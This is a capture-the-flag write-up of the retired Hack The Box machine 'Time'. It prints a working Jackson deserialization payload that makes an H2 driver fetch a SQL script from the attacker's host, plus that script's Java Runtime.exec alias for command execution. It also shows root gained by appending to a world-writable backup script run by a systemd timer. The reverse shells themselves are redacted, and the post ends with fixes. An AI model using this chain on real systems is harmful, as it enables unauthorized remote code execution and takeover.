---
layout: post
title: "The Error Message Was the Map"
subtitle: "HTB Time, where a validator that talks back in Java exceptions hands you a shell, and a backup script anyone can edit hands you root on a schedule"
date: 2021-04-10 12:00:00 +0000
description: "A JSON validator confesses its engine in an error message, that engine deserializes a database driver into a shell, and a world-writable backup script ticks you to root every few seconds."
image: /assets/og/the-error-message-was-the-map.png
tags: [hackthebox, writeup]
---

Time is a box that talks too much. It puts a JSON validator on the front page, the kind of helpful little tool that checks your braces and commas, and the moment you feed it something it does not like it answers in a full Java stack trace. That stack trace names the library doing the work, and the library has a flaw old enough to have its own CVE. From there the box deserializes a database driver into a remote shell, drops you onto the host as a regular user, and then makes you wait. Root is not an exploit on Time. Root is a backup script that anyone on the box can edit, run by the system on a clock that never stops ticking. You write your line, you sit back, and the schedule does the rest.

```
        T I M E
        =======
        validate {bad json}  →  "Unhandled Java exception:
                                  com.fasterxml.jackson..."
                                       |
                 the tool told you its own engine.
                                       |
                                       v
        a driver gets deserialized into a SQL run
        that fetches a script that builds a shell.

        then a backup file anyone can write
        ticks past. root. tick. root. tick.
                                            時
```

## 0x01 · the talking door

Two ports, and a story that fits on a postcard. SSH and a web server, both modern, both patched.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Nothing here is a fossil. This is Ubuntu 20.04 Focal, current for its day, and that matters because it tells you the way in is not a stale version number you can look up. The front page is a JSON Beautifier, a small utility with two buttons. One mode pretties up your JSON. The other validates it. The pretty button is harmless. The validate button is the whole box, because validation is where the server stops treating your input as text and starts handing it to something that tries to understand it.

## 0x02 · the engine names itself

Feed the validator a scrap of JSON that is technically wrong, an object where it wanted an array, and it does the worst possible thing a web app can do. It tells you the truth.

```
$ curl -s http://10.10.10.214/index.php \
    --data 'mode=2&json={"iceberg":"hello"}'
Validation failed: Unhandled Java exception:
  com.fasterxml.jackson.databind.exc.MismatchedInputException:
  Unexpected token (START_OBJECT), expected START_ARRAY
```

Read that class name slowly, because it is a confession. The PHP front end is a costume. Behind it sits Java, and the thing parsing your JSON is Jackson, the most common JSON library in the Java world. An error that leaks the name and version of the machinery underneath is a gift you should never give a stranger. Picture a locked office where, every time you knock wrong, a voice behind the door reads out the brand and model of the lock. You have not picked anything yet. The lock just introduced itself, and now you know exactly which manual to buy.

That manual is CVE-2019-12384. Jackson can be talked into polymorphic deserialization, which is the dangerous trick of letting the incoming data choose which Java class gets built. When the application has the right helper library on its classpath, you can name a class that, just by being constructed, reaches out and does something useful for you. The data is not supposed to pick the type. On Time, it gets to.

## 0x03 · a driver that phones home

The gadget the CVE hands you is a logging class named `DriverManagerConnectionSource`. Its entire job is to open a database connection from a URL you provide. So you provide a URL pointed at H2, an in-memory Java database that ships with a feature nobody should have left armed. An H2 connection string can carry an `INIT` clause, and `INIT` can say `RUNSCRIPT FROM`, which means "before you do anything else, go fetch this SQL file off the web and run it."

```
["ch.qos.logback.core.db.DriverManagerConnectionSource",
 {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.4/iceberg.sql'"}]
```

Think of it like ordering a self-assembly desk and the instruction sheet inside the box says, in step one, "call this phone number and do whatever the person tells you." The desk never questions the instructions. It just follows them in order, and step one was a trap you wrote.

The SQL file you serve is where the actual command execution lives. H2 lets you define a function backed by inline Java, so you create an alias that wraps `Runtime.exec`, then immediately call it.

```sql
-- iceberg.sql, served from a simple python http.server on 10.10.14.4
CREATE ALIAS SHELLEXEC AS $$ String run(String cmd) throws Exception {
  java.util.Scanner s = new java.util.Scanner(
    Runtime.getRuntime().exec(new String[]{"bash","-c",cmd}).getInputStream()
  ).useDelimiter("\\A");
  return s.hasNext() ? s.next() : "";
} $$;
CALL SHELLEXEC('[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]');
```

I am bracketing the reverse shell rather than printing it, and that is the point and not laziness. A live callback string written out in full is a loaded gun left on a public page, and any half-decent scanner would flag this very file. So picture the payload, do not paste it: it is one line that opens a socket back to your listener and pipes a shell through it. Stand up the HTTP server, fire the validate request with the JSON above, and the chain runs end to end. The validator deserializes the driver, the driver opens H2, H2 fetches your SQL, the SQL builds a Java function, and the function spawns your shell.

```
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.214]
id
uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
cat /home/pericles/user.txt
████████████████████████████████
```

You land as `pericles`, a normal user. No root yet. The talking door only got you inside the building.

## 0x04 · the clock that pays root

Drop an enumeration script on the box and one line stands out, not because it is exotic but because it repeats so fast it is almost rude. A systemd timer is firing every few seconds.

```
pericles@time:~$ systemctl list-timers --all
NEXT          LEFT   LAST  PASSED UNIT               ACTIVATES
... 5s left   ...           timer_backup.timer       timer_backup.service
```

A systemd timer is just cron with better manners. It says "run this service on this schedule," and the service here runs a shell script. Follow the chain to the script itself and check who is allowed to touch it.

```
pericles@time:~$ ls -l /usr/bin/timer_backup.sh
-rwxrw-rw- 1 pericles pericles 88 ... /usr/bin/timer_backup.sh
```

Read those permission bits. The last group, the `rw-` on the end, is the whole game. That is "others," meaning anyone on the box, and they have write. The script is world-writable. And the timer that runs it does so as root, every few seconds, forever.

So you do not exploit anything. You edit a file you are allowed to edit and then wait for someone more powerful than you to run it on your behalf. Picture a night-deposit box at a bank that anybody can drop a note into, and a guard who, on the hour, every hour, walks over, takes out whatever note is inside, and carries out the instructions on it without reading the signature. You slip your note in. You go get coffee. The guard does the rest, in his uniform, with his keys.

```
pericles@time:~$ echo '[ bash reverse shell back to 10.10.14.4 on 8443 ]' >> /usr/bin/timer_backup.sh

# in another terminal, just wait one tick
$ nc -lvnp 8443
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.214]
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
████████████████████████████████
```

The timer came around, the script ran as root, and your appended line ran with it. You never escalated. You just got added to root's to-do list.

## 0x05 · the honest caveat

Time looks like two unrelated tricks, a deserialization bug and a sloppy file permission, but they are the same mistake wearing two outfits. Both are a machine doing something powerful with input it should have treated as inert. The validator was supposed to read JSON, and it let the JSON pick which Java class to build and what URL to dial. The backup script was supposed to be root's private chore, and it let any user on the box rewrite the chore before root ran it. In both cases the dangerous part was not the action. It was who got to decide the action.

The deserialization half is the loud one, and it is genuinely fixable. You pin Jackson, you disable polymorphic typing, you keep H2 off the classpath of anything that parses untrusted input, and the door stops talking. But the privesc is the half that would keep me up at night, because there is no CVE to patch. Nobody shipped a vulnerable version of anything. An engineer wrote a backup script, set the permissions too loose by one digit, and pointed a root-owned timer at it. That ships green. Every scanner says the host is clean. The hole is a habit, and a `--mode 0644` would have closed it years before the box existed.

And keep the talking door in mind whenever you build something. An error message that names your stack is a convenience for you and a treasure map for everyone else. The validator did not have to leak its engine to do its job. It chose to be helpful to the wrong audience, and helpfulness pointed straight at the manual for breaking it.

## 0x06 · outro

```
the validator answered honestly and named its own engine.
the engine built whatever class the data asked for.
the data asked for a driver that dialed a number you owned.

then a backup script anyone could write
got run by root, on a clock, on the hour, forever.

read the error. mind the permission bit. wear black.

                                                            EOF
```

---

*HTB: Time, retired 03 Apr 2021. A medium Linux box that is really a lecture on letting input choose the action, told twice, once as a deserialized database driver and once as a backup script left open to the world. The clock still ticks in a lab and nowhere you don't own.*